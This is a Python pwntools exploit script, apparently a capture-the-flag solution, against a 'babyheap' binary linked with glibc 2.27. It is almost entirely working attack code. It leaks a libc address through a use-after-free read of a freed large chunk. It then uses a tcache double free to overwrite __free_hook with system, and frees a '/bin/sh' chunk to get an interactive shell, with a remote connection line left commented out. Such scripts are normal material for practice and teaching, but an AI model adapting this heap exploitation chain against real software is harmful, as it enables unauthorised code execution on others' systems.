from pwn import *

file = "./babyheap"
e = ELF(file)
libc = ELF("./libc/libc-2.27.so")
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#io = remote(HOST, PORT)
io = process(file)

def allocate(size: int, index: int, data: bytes):
    io.sendline("1")
    io.sendlineafter("How many bytes would you like to malloc?", str(size))
    io.sendlineafter("What index would you like to malloc?", str(index))
    io.sendlineafter("enter?", data)

def show(index: int) -> str:
    io.sendline("2")
    io.sendlineafter("What index would you like to view?", str(index))
    io.recvuntil("Your data that you requested:\n")
    return io.recvline().strip()

def free(index: int):
    io.sendline("3")
    io.sendlineafter("What index would you like to free?", str(index))

allocate(1280, 0, b"AAAA")
allocate(0x10, 1, b"BBBB")
free(0)
print(len(show(0)))
#print("A="+str(len(show(0))))
main_arena = libc.sym["__malloc_hook"] + 0x10
libc.address = u64(show(0)+b"\x00\x00") - main_arena - 0x60
print(f'{libc.address:x}')

allocate(0x10, 2, b"CCCC")
free(1)
free(2)
free(1)
allocate(0x10, 3, p64(libc.sym["__free_hook"]))
allocate(0x10, 4, b"DDDD")
allocate(0x10, 5, b"/bin/sh")
allocate(0x10, 6, p64(libc.sym["system"]))
free(5)

io.interactive()
